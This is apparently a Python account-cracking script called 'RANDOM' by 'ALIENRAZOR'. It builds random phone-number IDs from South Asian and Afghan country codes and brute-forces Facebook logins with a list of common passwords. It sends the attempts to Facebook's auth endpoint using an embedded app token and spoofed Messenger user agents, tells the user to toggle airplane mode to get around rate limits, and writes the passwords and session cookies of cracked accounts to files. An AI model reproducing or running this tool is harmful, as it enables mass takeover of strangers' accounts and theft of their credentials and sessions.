#coding :- utf-8
#update by :- ALIENRAZOR 
#Script Owner : ALIENRAZOR 
#---------------------
try:
	import os,requests,time,re,random,sys,uuid,string,json,subprocess,base64,zlib,hashlib
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError: 
	os.system('pip install requests > /dev/null')
	exit('\n Run Again ')
#----------------------LOGO---------------------#
logo = ("""

\033[0;91m                 ..              .:.
              ~YJ^.              .~J5!.
            ^G@J                   .J@B!
         ?~ B@Y                      5@&:7?
        ^@5:#@J                      Y@@!P@^
        ~@@#&@&7        ....:~      ?@@@#@@^
       7:J@@@@@7     :75####B7      ?@@@@@J^7
       !#55#@@@~:    :!~P@@@!      :~@@@#55#!
        ~P&@@@@5J?^.    !@@@Y   .^JJ5@@@@&P^
         .7YPB&@BB##BPYY#@@@@YPB##GB@&BPY7.
          ?B##&@@@@@@@@@@@@@@@@@@@@@@@##G7
           :?G&@&G#@@@@@@@@@@@@@&#B&@#P7.
              :~?7~~?#@&@@@@&@B?^!?7^.
                 !!YP5~~&@@&~~PPJ!!
                .^7J^  5@@@@Y .^J7^
                      J@&&&&@?
                     !#&G##B&#!
                     G5&5##P&PG
                     Y7&Y##5#7Y
                     ..GJ##5P..
                       J?#&Y?
                       ~7#&J^
                       .~#&!.
                        .#&:
                        .B&:
                         G#.
                         GB
                         5P
                         7J
                         .          



\033[0;92m



         ______________________________
	|                              |
        |    Github :     ALIENRAZOR   |
	|    Facebook :   ALIENRAZOR   |
	|    TOOL NAME : RANDOM        |
	|    STATUS :     FREE         |
	|______________________________|
                             \033[0;97m  """)
loop = 0
oks = []
pcp=[]
cps=[]
#--------------------MENU---------------------#
def menu():
	os.system('clear')
	print(logo)
	
	print('[1] Start Random Crack ')
	print('[0] Exit Menu')
	print('________________________')
	opt = input('[?] Choose : ')
	if opt =='1':
		Alien_randome()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91m [•] Choose valid option\033[0;97m')
#---------------------RANDOM_CRACK---------------------#
def Alien_randome():
	user=[]
	os.system('clear')
	print(logo)
	print('[⭐] FOR AFG  (070, 078, 077) ETC....')
	print('[⭐] FOR PAK  (92345, 92307, 92336, 92317)  ETC....')
	print('[⭐] FOR BD   (175 , 165 , 191 , 192198 , 199) ETC....')
	print('[⭐] FOR IND  (905 , 937, 700, 874 , 856) ETC....')
	print('________________________')
	kode = input('[?] Input Code : ')
	print('________________________')
	limit = int('99999')
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as ahd:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')
		for guru in user:
			ids = kode+guru
			Alien_pass = [ids,guru,'100200','700800','afghanistan','afghan1234','khan123','khan12345','600700','800900','786786','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345','786786','234564','374562','683457']
			ahd.submit(rndm,ids,Alien_pass)
	print('________________________')
	print('[✓] Crack process has been completed')
	print('[?] Total Ok Id Save in  /sdcard/ALIENRAZOR-OK.txt')
	print('[?] Total Cp Id Save in  /sdcard/ALIENRAZOR-CP.txt')
	print('________________________')
	print(' Press Inter To Back Menu')
#---------------------START-CRACK---------------------#
def rndm(ids,Alien_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [ALIENRAZOR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in Alien_pass:
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
			model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
			build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
			fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
			fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
			ua = 'Dalvik/2.1.0 (Linux; U; Android '+android_version+'; '+model+' Build/'+build+') [FBAN/Orca-Android;FBAV/'+fbav+';FBBV/'+fbbv+';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+android_version+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'
			data ={"locale": "en_GB","format": "json","email": ids,"password": pas,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
			head = {'user-agent':ua,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
			if 'session_key' in po:
				uid = po['uid']
				coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
				print('\r\r\033[1;32m [ALIENRAZOR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/ALIENRAZOR-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [ALIENRAZOR-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/ALIENRAZOR-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
menu()
